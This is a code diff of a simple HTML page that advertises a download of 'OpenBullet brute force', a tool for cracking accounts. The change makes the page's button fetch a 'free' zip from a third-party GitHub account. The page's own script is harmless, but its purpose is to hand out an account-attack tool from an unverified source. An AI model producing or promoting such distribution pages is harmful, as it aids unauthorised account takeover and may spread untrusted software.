@@ -1,68 +1,67 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title> OpenBullet brute force </title>
-        <meta name="description" content="Download Openbullet Brute-Force"/>
-        <meta property="og:image" content="https://pbs.twimg.com/profile_images/1464142453057937430/43qfAhVM_400x400.jpg"/>
-    <style>
-        body {
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            font-family: Arial, sans-serif;
-            background-color: #f5f5f5;
-        }
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>OpenBullet brute force</title>
+  <meta name="description" content="Download Openbullet Brute-Force"/>
+  <meta property="og:image" content="https://pbs.twimg.com/profile_images/1464142453057937430/43qfAhVM_400x400.jpg"/>
 
-        h2 {
-            margin-bottom: 20px;
-            color: #333;
-        }
+  <style>
+    body {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      font-family: Arial, sans-serif;
+      background-color: #f5f5f5;
+    }
 
-        #downloadBtn {
-            background-color: #4CAF50; /* Green color */
-            color: white;
-            padding: 15px 30px;
-            font-size: 18px;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            transition: background-color 0.3s, transform 0.2s;
-        }
+    h2 { margin-bottom: 20px; color: #333; }
 
-        #downloadBtn:hover {
-            background-color: #45a049;
-            transform: scale(1.05);
-        }
+    #downloadBtn {
+      background-color: #4CAF50;
+      color: white;
+      padding: 15px 30px;
+      font-size: 18px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background-color 0.3s, transform 0.2s;
+    }
 
-        #downloadBtn:active {
-            transform: scale(0.95);
-        }
-    </style>
+    #downloadBtn:hover { background-color: #45a049; transform: scale(1.05); }
+    #downloadBtn:active { transform: scale(0.95); }
+    #downloadBtn:disabled { opacity: 0.6; cursor: default; transform: none; }
+  </style>
 </head>
 <body>
-    <button id="downloadBtn">Download Now</button>
+  <h2>OpenBullet brute force</h2>
+  <button id="downloadBtn">Download Now</button>
 
-            <script>
-        // URL of the APK
-        const apkUrl = "https://github.com/LibyanHacker/openbullet-free/archive/refs/heads/main.zip";
+  <script>
+    // URL of the file
+    const apkUrl = "https://github.com/LibyanHacker/openbullet-free/archive/refs/heads/main.zip";
 
-        // Create a temporary link
-        const link = document.createElement("a");
-        link.href = apkUrl;
-        document.body.appendChild(link);
+    const btn = document.getElementById("downloadBtn");
+    btn.addEventListener("click", function () {
+      // Create a temporary link and click it when user presses the button
+      const link = document.createElement("a");
+      link.href = apkUrl;
 
-        // Trigger click automatically
-        // link.click();
+      // Optional: suggested filename (may be ignored for cross-origin URLs)
+      link.setAttribute("download", "openbullet-free-main.zip");
 
-        // Remove the link from DOM
-        document.body.removeChild(link);
-    </script>
+      // Append, click, and remove
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+
+      // Provide feedback / prevent double click
+      btn.disabled = true;
+      btn.textContent = "Downloading...";
+    });
+  </script>
 </body>
 </html>
-
-
-
